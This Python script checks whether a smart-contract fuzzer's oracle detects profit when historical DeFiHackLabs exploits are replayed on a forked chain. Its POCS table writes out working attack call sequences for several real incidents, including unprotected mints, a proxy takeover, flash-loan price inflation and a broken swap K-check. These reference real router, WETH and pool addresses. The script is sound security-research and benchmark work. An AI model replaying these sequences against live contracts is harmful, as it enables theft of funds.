#!/usr/bin/env python3
"""Run each DeFiHackLabs target through *our* fuzzer's fork fund-flow oracle.

This is the SmartBugs-style empirical pass for the fork dataset: for every
contract we author a best-effort `FuzzInput` of *direct target-ABI calls* (the
only thing the fuzzer's action space can express) and run it through
`FoundryFuzzer.run_input` in fork mode. A PoC is "usable" only if a fuzzer
account actually nets value — i.e. our oracle prints a
`BUG_SIGNAL: attacker_gained …` line (reentrancy profit lands on the unified
attacker) or the value verdict `BUG_SIGNAL: attacker_profit …`. A lone
`target_drained`/`target_loss` (prefund swept to owner) is treated as a honeypot
artifact, not a true positive (same rule as SmartBugs).

Most DeFiHackLabs hacks are NOT expressible here — they need flash-loan
callbacks, bespoke attacker contracts, external DEX swaps, or pre-owned
holdings, none of which a flat target-ABI call sequence can represent. Those get
`skip: true` with a precise structural reason. The ones that *do* reduce to an
unprotected target call (arbitrary mint / unprotected initialize / missing
access control on migrate/unstake) fire our signal and stay usable.

The financial-loss oracle auto-discovers every ERC20 that moved (from Transfer
logs) plus the target itself, so token-profit exploits are detected without any
per-PoC watch-token hint.

Usage:
    uv run python utils/validate_defihacklabs_bugsignal.py
    uv run python utils/validate_defihacklabs_bugsignal.py --only Uerii
    uv run python utils/validate_defihacklabs_bugsignal.py --write
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT / "src" / "experiment" / "dataloader"))
sys.path.insert(0, str(ROOT / "src" / "experiment" / "run"))
sys.path.insert(0, str(ROOT / "utils"))

from schema import load_all                # noqa: E402
from registry import DATASET_SPECS         # noqa: E402
from scaffold import prepare               # noqa: E402
from _dataset_io import load_working, save_working   # noqa: E402
from fuzz.fuzzer.foundry import FoundryFuzzer   # noqa: E402
from fuzz.llm.agent import FuzzInput            # noqa: E402
from fuzz.config import LLMConfig               # noqa: E402

# The method's real per-sequence cap: LLMGenerator truncates any LLM output to
# fi.calls[:max_calls_per_item] (generator.py) and the GBNF grammar bounds
# llama-cpp to the same. A hand-authored PoC longer than this "fires" in this
# validator (which runs the raw calls uncapped) but is NOT reproducible by the
# method — it would be silently truncated to the first N calls. Wire the guard to
# the config field, not a literal, so it tracks the real cap.
MAX_CALLS_PER_ITEM = LLMConfig().max_calls_per_item

# Curation results round-trip through the manifest/enrich split (see _dataset_io).
DATASET_KEY = "defihacklabs"
SIDECAR = pathlib.Path("/tmp/dhl_bugsignal.json")

ZERO = "0x0"
MAXU = "0x" + "f" * 64


def _h(n: int) -> str:
    return hex(n)


# ── Best-effort FuzzInputs for the expressible (direct-target-call) exploits ──
# The financial-loss oracle auto-discovers every ERC20 that moved (Transfer logs)
# plus the target itself, so no per-PoC watch-token hint is needed.
POCS: dict[str, dict] = {
    "defihacklabs/2022-10_Uerii": dict(
        strategy="access_control_probe",
        description="public mint() has no access control — mints UERII straight to the caller",
        calls=[["mint", [], ZERO, "attacker_address"]],
    ),
    "defihacklabs/2024-09_WXETA": dict(
        strategy="access_control_probe",
        description="unprotected initialize() unlocks mint(); mint WXETA to the attacker",
        calls=[
            ["initialize", [MAXU], ZERO, "attacker_address"],
            ["mint", ["attacker_address", _h(10**24)], ZERO, "attacker_address"],
        ],
    ),
    "defihacklabs/2022-10_BEGO": dict(
        strategy="access_control_probe",
        description="mint() signature check bypassed with empty r/s/v arrays — mint BEGO to attacker",
        calls=[["mint", [_h(10**30), "t", "attacker_address", [], [], []], ZERO, "attacker_address"]],
    ),
    "defihacklabs/2022-10_Templedao": dict(
        strategy="access_control_probe",
        description="unprotected migrateStake() credits the attacker the pool's whole stake; withdrawAll drains the LP",
        calls=[
            ["migrateStake", ["attacker_address", _h(321154865567124596801893)], ZERO, "attacker_address"],
            ["withdrawAll", [False], ZERO, "attacker_address"],
        ],
        fail_reason="migrateStake() calls back into oldStaking.migrateWithdraw(); the attacker must be a "
                    "contract implementing that callback (bespoke attacker contract), so a flat fuzzer "
                    "account is never credited the stake",
    ),
    "defihacklabs/2023-05_FAPEN": dict(
        strategy="access_control_probe",
        description="unstake() bad balance check lets a non-staker withdraw the contract's own FAPEN",
        calls=[["unstake", [_h(9521992386510669)], ZERO, "attacker_address"]],
    ),
    # Speculative direct-call attempts (let the oracle decide):
    "defihacklabs/2022-12_DFS": dict(
        strategy="access_control_probe",
        description="attempt unprotected mint() path",
        calls=[
            ["setMintlist", [["attacker_address"]], ZERO, "attacker_address"],
            ["mint", [_h(10**24)], ZERO, "attacker_address"],
        ],
        fail_reason="real exploit drains via PancakePair skim() loop (flash-swap reserve manipulation); "
                    "mint()/setMintlist are owner-gated — no direct-call profit path",
    ),
    "defihacklabs/2023-06_SHIDO": dict(
        strategy="access_control_probe",
        description="attempt unprotected withdrawToken()",
        calls=[["withdrawToken", ["attacker_address"], ZERO, "attacker_address"]],
        fail_reason="real exploit profits via DODO flash-loan + lock/claim across SHIDO+router; "
                    "withdrawToken/withdrawETH are owner-gated",
    ),
    "defihacklabs/2023-05_BabyDogeCoin": dict(
        strategy="access_control_probe",
        description="attempt unprotected claimTokens()",
        calls=[["claimTokens", [], ZERO, "attacker_address"]],
        fail_reason="real exploit is a fee-on-transfer reentrancy via a bespoke attacker contract; "
                    "no direct claim path nets the fuzzer account",
    ),
    # NGFS — three unprotected target calls bootstrap the attacker into the
    # privileged proxy/library role, then reserveMultiSync mints NGFS straight to
    # the attacker (SafeMath .air = addition, money-from-nowhere). Gain realizes in
    # the target token; the real PoC's router swap to USDT is only the cash-out.
    "defihacklabs/2024-04_NGFS": dict(
        strategy="access_control_probe",
        description="delegateCallReserves() (unprotected) sets proxy=attacker; setProxySync(self) makes "
                    "attacker the library; reserveMultiSync(self, amount) mints NGFS to the attacker.",
        calls=[
            ["delegateCallReserves", [], ZERO, "attacker_address"],
            ["setProxySync", ["attacker_address"], ZERO, "attacker_address"],
            ["reserveMultiSync", ["attacker_address", "0xd3c21bcecceda1000000"], ZERO, "attacker_address"],
        ],
    ),
    # EFLeverVault — Balancer flash-loan price-oracle manipulation expressible WITHOUT
    # an attacker-side callback: the flashLoan RECEIVER is the target vault itself, so
    # the only declared external is the Balancer vault. deposit 0.1 ETH (mint shares
    # cheap) -> BALANCER_VAULT.flashLoan(vault,[WETH],[1000e18],"0x2") routes into the
    # vault's own receiveFlashLoan/_withdraw and inflates getVirtualPrice -> withdraw
    # 0.09 shares at the inflated price -> net attacker ETH. Self-funded; profit native.
    "defihacklabs/2022-10_EFLeverVault": dict(
        strategy="price_oracle_probe",
        description="Balancer flashLoan with the vault as receiver inflates getVirtualPrice; "
                    "deposit cheap, flash, withdraw inflated -> attacker ETH.",
        calls=[
            ["deposit", ["0x16345785d8a0000"], "0x16345785d8a0000", "attacker_address"],
            ["BALANCER_VAULT.flashLoan",
             ["target_address", ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"],
              ["0x3635c9adc5dea00000"], "0x307832"], "0x0", "attacker_address"],
            ["withdraw", ["0x13fbe85edc90000"], "0x0", "attacker_address"],
        ],
    ),
    # TecraSpace — TcrToken.burnFrom has REVERSED allowance indexing (checks
    # _allowances[msg.sender][from], not [from][msg.sender]); attacker self-approves
    # the pool then burns the pool's TCR. Buy TCR (own ETH, router) -> burnFrom(pool)
    # -> POOL.sync() spikes TCR price -> sell TCR back to USDT inflated -> attacker USDT.
    "defihacklabs/2022-02_TecraSpace": dict(
        strategy="access_control_probe",
        description="reversed-allowance burnFrom lets the attacker burn the pool's TCR after a "
                    "self-approve; buy/burn/sync/sell nets USDT.",
        calls=[
            ["approve", ["0x420725A69E79EEffB000F98Ccd78a52369b6C5d4", "max"], ZERO, "attacker_address"],
            ["approve", ["0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", "max"], ZERO, "attacker_address"],
            ["ROUTE.swapExactETHForTokens",
             [1, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                  "0xdAC17F958D2ee523a2206206994597C13D831ec7", "target_address"],
              "attacker_address", "now"], "0x7ce66c50e2840000", "attacker_address"],
            ["burnFrom", ["0x420725A69E79EEffB000F98Ccd78a52369b6C5d4", "58027183904946"], ZERO, "attacker_address"],
            ["POOL.sync", [], ZERO, "attacker_address"],
            ["balanceOf", ["attacker_address"], ZERO, "attacker_address"],
            ["ROUTE.swapExactTokensForTokens",
             ["$ret5", 1, ["target_address", "0xdAC17F958D2ee523a2206206994597C13D831ec7"],
              "attacker_address", "now"], ZERO, "attacker_address"],
        ],
    ),
    # PLN — price-oracle exploit unlocked by declared externals (WETH + UniV2
    # ROUTER, from extend.external) + $ret chaining: buy PLN with WETH, trip the
    # buggy transferFrom that credits the caller, sell the inflated balance back to
    # WETH, withdraw → net attacker ETH. Mirrors the stored enrich poc.calls.
    "defihacklabs/2024-09_PLN": dict(
        strategy="logic_error_probe",
        description="PLNTOKEN.transferFrom mints/credits the caller; buy PLN with WETH on the UniV2 "
                    "router, trip transferFrom, sell the inflated PLN back to WETH, withdraw — net attacker ETH.",
        calls=[
            ["WETH.deposit", [], "0xc7d713b49da0000", "attacker_address"],
            ["WETH.approve", ["0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", "max"], ZERO, "attacker_address"],
            ["approve", ["0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", "max"], ZERO, "attacker_address"],
            ["WETH.balanceOf", ["attacker_address"], ZERO, "attacker_address"],
            ["ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens",
             ["$ret3", 0, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "target_address"],
              "attacker_address", "now"], ZERO, "attacker_address"],
            ["transferFrom", ["0x3f5a63B89773986Fd436a65884fcD321DE77B832",
                              "0x000000000000000000000000000000000000dEaD", 0], ZERO, "attacker_address"],
            ["balanceOf", ["attacker_address"], ZERO, "attacker_address"],
            ["ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens",
             ["$ret6", 0, ["target_address", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"],
              "attacker_address", "now"], ZERO, "attacker_address"],
            ["WETH.balanceOf", ["attacker_address"], ZERO, "attacker_address"],
            ["WETH.withdraw", ["$ret8"], ZERO, "attacker_address"],
        ],
    ),
    # Swapos — SwaposV2Pair.swap has a broken constant-product check: balances are
    # scaled by 10000 but the reserve product by 1000**2, a 100x mismatch, so a swap
    # can drain ~99% of a reserve for a trivial input. Wrap a little WETH (token1),
    # send 10 wei to the pair, then swap out the pair's whole token0 (swpToken) to the
    # attacker. Raw Pair.swap but the amount0Out is a fork-deterministic constant (no
    # callback: data is empty), so no computed-amountOut $ret is needed.
    "defihacklabs/2023-04_Swapos": dict(
        strategy="logic_error_probe",
        description="SwaposV2Pair.swap's K check scales balances by 1e4 vs reserves by 1e6 (100x off); "
                    "seed 10 wei WETH then swap the pair's entire token0 to the attacker.",
        calls=[
            ["WETH.deposit", [], "0xde0b6b3a7640000", "attacker_address"],
            ["WETH.transfer", ["target_address", "0xa"], ZERO, "attacker_address"],
            ["swap", [_h(142658161144708222114663), ZERO, "attacker_address", "0x"], ZERO, "attacker_address"],
        ],
    ),
}

# ── Structural skip reasons for the non-expressible exploits ──────────────────
_FLASH_SWAP = ("exploit requires a flash-loan callback + external DEX swaps to realize WBNB/WETH "
               "profit; not expressible as a flat target-ABI FuzzInput")
_CUSTOM_C = ("exploit deploys a bespoke attacker contract with callbacks; the fork harness only "
             "issues flat target-ABI calls from fuzzer accounts")
_HOLDINGS = ("attack needs pre-owned tokens / a whale or LP balance the fresh fuzzer account lacks "
             "(harness deals only native gas)")
SKIPS: dict[str, str] = {
    "defihacklabs/2020-12_Cover": _HOLDINGS + " — deposit() requires BPT before claimRewards mints COVER",
    "defihacklabs/2021-05_RariCapital": _CUSTOM_C + "; cross-contract reentrancy through ibETH",
    "defihacklabs/2022-02_BuildF": "governance proposal must execute from the historical attacker "
                                   "address hardcoded in the approve() payload; runner address reverts transferFrom",
    "defihacklabs/2022-06_InverseFinance": _FLASH_SWAP + "; Curve-LP spot-oracle manipulation, mint() needs underlying",
    "defihacklabs/2022-12_JAY": _CUSTOM_C + "; sell() reentered via the attacker's receive()",
    "defihacklabs/2023-08_Uwerx": _FLASH_SWAP + "; transfer-to-pair burn + skim/sync reserve inflation",
    "defihacklabs/2025-03_UNI": _FLASH_SWAP + "; UniswapV2Pair reserve manipulation (mint LP needs deposits)",
    "defihacklabs/2025-04_Roar": _FLASH_SWAP + "; UniswapV2Pair reserve manipulation (mint LP needs deposits)",
    "defihacklabs/2022-10_ATK": _FLASH_SWAP + "; pancakeCall flash-swap, no unprotected mint",
    "defihacklabs/2023-05_Bitpaidio": _FLASH_SWAP + "; lock/withdraw reward miscalc driven by a flash-loan",
    "defihacklabs/2023-06_SELLC03": _FLASH_SWAP + "; DPP flash-loan + add/removeLiquidity miner manipulation",
    "defihacklabs/2023-07_Bamboo": _FLASH_SWAP,
    "defihacklabs/2023-07_FFIST": _CUSTOM_C + "; computed-address transfer + Pair.sync reserve abuse",
    "defihacklabs/2023-08_EHIVE": _CUSTOM_C + "; 28 helper contracts + Aave flash-loan unstake chain",
    "defihacklabs/2023-10_WiseLending": _CUSTOM_C + "; NFT-position deposit/withdraw share-price reentrancy",
    "defihacklabs/2024-09_DOGGO": _CUSTOM_C + "; UniswapV3 flash-callback token bug",
    "defihacklabs/2024-09_HANAToken": _CUSTOM_C + "; UniswapV3 flash-callback token bug",
    "defihacklabs/2025-06_AAVEBoost": _CUSTOM_C + "; repeated boost-balance accrual loop via a proxy",
    "defihacklabs/2022-08_EGD_Finance": _FLASH_SWAP + "; getEGDPrice oracle manipulation then claimAllReward",
    "defihacklabs/2023-07_LUSD": _FLASH_SWAP + "; DODO flash-loan price manipulation",
    "defihacklabs/2023-10_MicDao": _CUSTOM_C + "; DPP flash-loan + 80 sybil helper contracts",
    "defihacklabs/2025-01_Ast": _FLASH_SWAP + "; PancakeV3 flash-callback logic bug",
    # ── 2026-06-20 re-survey rejections (SURVEY candidates 1-3,5; gates the keyword
    #    triage missed). Each verified-source but structurally out of scope. ──────
    "defihacklabs/2023-12_HYPR": _CUSTOM_C + "; finalizeERC20Withdrawal's onlyOtherBridge check calls "
        "back messenger.xDomainMessageSender() and requires the L2-bridge value — the attacker must BE "
        "a contract implementing that callback (it sets itself as messenger via initialize(self))",
    "defihacklabs/2021-12_Visor": _CUSTOM_C + "; RewardsHypervisor.deposit calls back "
        "from.delegatedTransferERC20(...) which the attacker stubs as a no-op so vVISR shares mint "
        "without VISR being pulled",
    "defihacklabs/2025-03_YziAIToken": "the value-moving transferFrom branch is gated msg.sender==manager "
        "(set only in the constructor, no unprotected setter); the historical attacker WAS the manager. "
        "A privileged-key prank — the fuzzer's fixed accounts can't satisfy it. NOT a PANDORA twin",
    "defihacklabs/2022-08_DDC": _FLASH_SWAP + "; handleDeductFee->distributeFee credits the feeHandler "
        "(the `user`/attacker param is event-only), so profit needs buy + Pair reserve manipulation + "
        "terminal router swap, not a direct credit",
}


@dataclasses.dataclass
class Outcome:
    rid: str
    triggered: bool = False
    signals: list = dataclasses.field(default_factory=list)
    reason: str = ""
    calls: list | None = None
    description: str = ""
    strategy: str = ""
    note: str = ""


def run_one(c, spec) -> Outcome:
    rid = c.id
    prep = prepare(c, spec)
    if not prep.ok:
        return Outcome(rid, reason=f"{prep.status}: {prep.reason}", note="prepare-fail")
    poc = POCS.get(rid)
    if poc is None:
        return Outcome(rid, reason=SKIPS.get(rid, "no direct-call PoC authored"), note="structural-skip")

    ncalls = len(poc.get("calls") or [])
    if ncalls > MAX_CALLS_PER_ITEM:
        # Loud warning, but still run (warn-only): an over-cap PoC can "fire" here
        # yet the method (LLMGenerator) would truncate it to the first N calls, so
        # the row is only honestly runnable if a <=cap prefix also fires. Shorten
        # poc.calls to <=MAX_CALLS_PER_ITEM before marking the row runnable.
        print(f"  !! WARN {rid}: poc has {ncalls} calls > max_calls_per_item="
              f"{MAX_CALLS_PER_ITEM}; the method truncates to the first "
              f"{MAX_CALLS_PER_ITEM} — this PoC is not reproducible as authored.")

    # Thread the row's declared externals + per-sample template (extend.external /
    # extend.setup_template) through, exactly as the real run pipeline does
    # (run.py:_build_config). Without this a fork row whose PoC calls a declared
    # external `<var>.<method>` (PLN's router/WETH) can't be validated.
    fz = FoundryFuzzer(str(prep.work), prep.target, abi=prep.abi, fork=prep.fork_cfg,
                       external=prep.external, setup_template=prep.setup_template)
    if not fz.compile():
        return Outcome(rid, reason="build_fail: harness compile failed", note="compile-fail")
    fi = FuzzInput(calls=poc["calls"], description=poc["description"])
    res = fz.run_input(fi, strategy=poc["strategy"], debug=True)
    # Store the signal NAME only (first token); asset/token/amount/symbol are line fields
    # in the net-profit format, so dedup the names for a clean dataset `signals` list.
    signals = sorted({l.split("BUG_SIGNAL:")[1].strip().split()[0]
                      for l in res.decoded_logs if "BUG_SIGNAL:" in l})
    # Profit = a fuzzer account nets value: attacker_gained (any asset; reentrancy profit
    # lands on the unified attacker) or the value verdict attacker_profit. target_* alone
    # = honeypot.
    profit = bool(set(signals) & {"attacker_gained", "attacker_profit"})
    if profit:
        return Outcome(rid, triggered=True, signals=signals, calls=poc["calls"],
                       description=poc["description"], strategy=poc["strategy"],
                       note=res.forge_status)
    reason = poc.get("fail_reason") or (
        f"authored direct-call PoC did not net the fuzzer account "
        f"(forge_status={res.forge_status}, signals={signals or 'none'})")
    return Outcome(rid, signals=signals, reason=reason, note=f"no-profit/{res.forge_status}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--only")
    ap.add_argument("--write", action="store_true")
    args = ap.parse_args()

    spec = DATASET_SPECS["defihacklabs"]
    # The full verified candidate set (the old usable file); run_one decides which fire.
    contracts = [c for c in load_all("defihacklabs") if c.provenance.get("verified")]
    if args.only:
        contracts = [c for c in contracts if c.id.endswith(args.only) or c.id == args.only]

    outcomes: dict[str, Outcome] = {}
    for i, c in enumerate(contracts, 1):
        o = run_one(c, spec)
        outcomes[c.id] = o
        mark = "FIRE" if o.triggered else "skip"
        print(f"[{i:2}/{len(contracts)}] {mark}  {c.id:40} "
              f"{','.join(o.signals) if o.signals else o.note:22} {o.reason[:48]}")

    nfire = sum(1 for o in outcomes.values() if o.triggered)
    print(f"\n=== {nfire}/{len(outcomes)} trigger our BUG_SIGNAL ===")
    SIDECAR.write_text(json.dumps({k: vars(v) for k, v in outcomes.items()}, indent=2))
    print(f"sidecar -> {SIDECAR}")

    if args.write:
        _write_back(outcomes)


def _write_back(outcomes: dict[str, Outcome]) -> None:
    doc = load_working(DATASET_KEY)
    for c in doc["contracts"]:
        o = outcomes.get(c["id"])
        if o is None:
            continue
        # Preserve the prior fork-reference reproduction result (does the documented
        # exploit replay on-chain) before `poc` is repurposed for the fuzzer signal.
        prev = c.get("poc")
        if isinstance(prev, dict) and prev.get("kind") == "fork_reference":
            c.setdefault("provenance", {})["reference_exploit"] = {
                "poc_path": prev.get("poc_path"),
                "reproduced": prev.get("reproduced"),
                "logs": prev.get("logs"),
            }
        if o.triggered:
            c["skip"] = False
            c["skip_reason"] = None
            c["poc"] = {
                "kind": "fuzzer_bug_signal",
                "category": c.get("category"),
                "strategy": o.strategy,
                "description": o.description,
                "calls": o.calls,
                "signals": o.signals,
                "reproduced": True,
            }
        else:
            c["skip"] = True
            c["skip_reason"] = o.reason
            c["poc"] = None
    man_path, enr_path = save_working(DATASET_KEY, doc)
    print(f"wrote {man_path.name} + {enr_path.name}")


if __name__ == "__main__":
    main()
